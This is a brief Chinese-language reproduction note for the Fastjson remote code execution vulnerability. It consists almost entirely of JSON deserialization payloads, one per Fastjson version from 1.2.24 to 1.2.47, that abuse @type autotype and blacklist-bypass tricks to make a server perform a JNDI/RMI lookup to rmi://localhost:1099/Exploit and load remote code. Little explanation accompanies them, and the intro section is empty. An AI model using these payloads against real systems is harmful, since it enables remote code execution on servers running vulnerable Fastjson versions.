# Fastjson <=1.2.47 远程代码执行漏洞

### 一、漏洞简介

### 二、漏洞影响

Fastjson < 1.2.51

### 三、复现过程

https://github.com/ianxtianxt/Fastjson-1.2.47-rce


```json
1.2.24
{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true}}

未知版本(1.2.24-41之间)
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}

1.2.41
{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}

1.2.42
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true};

1.2.43
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true]}

1.2.45
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://localhost:1099/Exploit"}}

1.2.47
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}}}
```